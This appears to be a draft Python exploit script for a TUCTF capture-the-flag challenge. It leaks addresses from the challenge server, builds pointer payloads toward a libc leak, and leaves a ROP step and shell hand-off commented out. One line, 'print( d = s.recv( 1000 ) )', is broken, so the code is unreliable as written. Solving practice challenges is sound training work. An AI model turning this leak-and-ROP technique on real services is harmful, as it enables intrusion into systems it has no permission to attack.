#!/usr/bin/env python3

#-*- coding: utf-8 -*-
import socket
from time import sleep
import struct
import telnetlib
import os


def connect( ip, port ):
    return socket.create_connection((ip, port))

def p( x ):
    return struct.pack('<I', x )

def p64( x ):
    return struct.pack('<Q', x )

def u( x ):
    return struct.unpack('<I', x )[0]

def u64( x ):
    return struct.unpack('<Q', x )[0]

def interact( s ):
    print('----- interactive mode -----')
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def main():
    s = connect('chal.tuctf.com', 30504 )
    
    d = s.recv( 1000 )
    addrs = d.split(b'\n')[2:4]
    print( addrs )
    ebx = int(addrs[0], 16)-0x4c
    ebp = int(addrs[1], 16)+0x1c
    puts = ebx + 24
    
    print( 'ebx : 0x%8x'%ebx )
    print( 'ebp : 0x%8x'%ebp )
    #print( 'puts : 0x%8x'%puts )

    #step1
    payload = b''
    payload += b'\n'
    s.sendall( payload )
    print( s.recv( 1000 ) )
    
    
    f = open( 'attack', 'wb' )
    f.write( payload )
    f.close()

    #step2
    sleep( 1 )
    payload = p( ebx + 28 )
    payload += b'\n'
    s.sendall( payload )
    print( s.recv( 1000 ) )
    f = open( 'attack', 'ab' )
    f.write( payload )

    #step3
    sleep( 1 )
    payload = p( puts ) * 4
    f.write( payload )
    f.close()
    """    
    #step2
    sleep(1)
    payload = b''
    payload += p( ebx + 24 )    #puts
    payload += b'AAAA'  #fake
    payload += p( ebx + 28 )    #libc_start_main
    payload += b'\n'
    s.sendall( payload )
    s.recv( 1000 )

    #step3
    sleep( 1 )
    payload = b''
    payload += p( 0x1393 )  #rop
    s.sendall( payload )
    """
    print( d = s.recv( 1000 ) )
    puts = u( d[:4] )

    print( " : %8x"%puts )

    #interact( s )

if( __name__ == '__main__' ): main()
